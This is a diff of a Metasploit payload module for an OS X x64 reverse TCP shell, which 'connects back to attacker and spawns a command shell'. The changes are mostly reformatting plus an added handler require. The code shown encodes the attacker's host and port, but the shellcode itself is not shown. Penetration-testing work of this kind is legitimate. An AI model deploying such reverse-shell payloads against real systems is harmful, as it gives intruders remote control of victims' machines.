@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'msf/core/handler/reverse_tcp'
+
 module MetasploitModule
 
   CachedSize = 128
@@ -15,14 +17,14 @@ module MetasploitModule
     super(
       merge_info(
         info,
-        'Name' => 'OS X x64 Shell Reverse TCP',
-        'Description' => 'Connect back to attacker and spawn a command shell',
-        'Author' => 'nemo <nemo[at]felinemenace.org>',
-        'License' => MSF_LICENSE,
-        'Platform' => 'osx',
-        'Arch' => ARCH_X64,
-        'Handler' => Msf::Handler::ReverseTcp,
-        'Session' => Msf::Sessions::CommandShellUnix
+      'Name'          => 'OS X x64 Shell Reverse TCP',
+      'Description'   => 'Connect back to attacker and spawn a command shell',
+      'Author'        => 'nemo <nemo[at]felinemenace.org>',
+      'License'       => MSF_LICENSE,
+      'Platform'      => 'osx',
+      'Arch'          => ARCH_X64,
+      'Handler'       => Msf::Handler::ReverseTcp,
+      'Session'       => Msf::Sessions::CommandShellUnix
       )
     )
 
@@ -44,7 +46,7 @@ module MetasploitModule
       raise ArgumentError, 'LHOST must be in IPv4 format.'
     end
 
-    cmd = (datastore['CMD'] || '') + "\x00"
+    cmd  = (datastore['CMD'] || '') + "\x00"
     encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack1('N')
     encoded_host = Rex::Socket.addr_aton(lhost).unpack1('V')
     encoded_host_port = format('0x%.8x%.8x', encoded_host, encoded_port)
